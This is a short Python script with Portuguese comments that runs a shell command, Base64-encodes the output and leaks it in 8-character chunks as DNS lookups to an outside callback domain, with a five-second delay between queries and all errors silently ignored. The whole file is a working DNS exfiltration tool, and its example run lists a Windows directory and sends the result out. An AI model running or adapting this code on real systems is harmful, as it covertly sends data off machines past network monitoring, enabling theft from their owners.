import socket
import subprocess
import base64
import time  # Importa o módulo time

def execute_command_and_send_dns(command, domain):
    try:
        # Executa o comando e captura a saída
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        
        # Converte o resultado para Base64
        encoded_result = base64.b64encode(result).decode('utf-8')
        
        # Divide o resultado em partes de 8 caracteres
        chunks = [encoded_result[i:i+8] for i in range(0, len(encoded_result), 8)]
        
        # Envia requisições DNS para cada parte
        for chunk in chunks:
            subdomain = f"{chunk}.{domain}"
            try:
                socket.gethostbyname(subdomain)
            except socket.gaierror:
                pass
            time.sleep(5)  # Adiciona um atraso de 5 segundos entre as requisições
    except subprocess.CalledProcessError as e:
        pass  # Ignora erros de execução do comando
    except Exception as e:
        pass  # Ignora outros erros

# Exemplo de uso
command_to_execute = "dir"  # Comando padrão para listar diretórios no Windows
target_domain = "85051931-332d-4552-9814-1415091cce22.dnshook.site"  # Substitua pelo domínio desejado
execute_command_and_send_dns(command_to_execute, target_domain)
